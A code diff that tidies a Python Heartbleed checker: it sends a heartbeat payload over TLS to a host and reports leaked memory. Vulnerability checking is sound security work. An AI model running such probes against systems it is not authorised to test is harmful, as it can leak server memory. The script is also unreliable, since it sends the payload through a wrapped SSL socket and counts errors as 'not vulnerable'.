@@ -1,5 +1,4 @@
 import socket
-import struct
 import time
 import ssl
 
@@ -12,7 +11,6 @@ def send_heartbeat(sock):
         sock.send(HEARTBLEED_PAYLOAD)
         time.sleep(1)  # Wait for response
         response = sock.recv(4096)
-
         if len(response) > 3:
             return True, response
         return False, None
@@ -22,24 +20,17 @@ def send_heartbeat(sock):
 def check_heartbleed(host, port=443):
     """Tests if a server is vulnerable to Heartbleed by sending a malformed heartbeat request."""
     results = []
-
     try:
-        # Create SSL Connection
         context = ssl.create_default_context()
         conn = context.wrap_socket(socket.socket(socket.AF_INET), server_hostname=host)
         conn.settimeout(5)
         conn.connect((host, port))
-
-        # Perform the Heartbleed test
         vulnerable, leaked_data = send_heartbeat(conn)
         conn.close()
-
         if vulnerable:
             results.append(f"[!] Vulnerable to Heartbleed! Memory leak detected ({len(leaked_data)} bytes).")
         else:
             results.append("[+] Not vulnerable to Heartbleed. Server properly rejects heartbeat requests.")
-
     except (socket.timeout, socket.error, ssl.SSLError) as e:
         results.append(f"[+] No Heartbleed vulnerability detected. Error: {e}")
-
     return results
